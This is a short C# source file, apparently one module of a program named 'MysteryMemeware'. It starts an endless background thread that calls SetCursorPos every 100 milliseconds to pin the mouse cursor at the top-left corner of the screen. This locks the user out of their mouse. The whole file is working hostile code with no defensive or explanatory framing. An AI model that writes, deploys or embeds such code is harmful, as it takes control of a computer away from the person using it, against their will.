namespace MysteryMemeware
{
    public static class MouseLockModule
    {
        public static void LockMouse()
        {
            System.Threading.Thread childThread = new System.Threading.Thread(() =>
            {
                while (true)
                {
                    SetCursorPos(0, 0);
                    System.Threading.Thread.Sleep(100);
                }
            });
            childThread.Start();
        }
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern bool SetCursorPos(int X, int Y);

    }
}
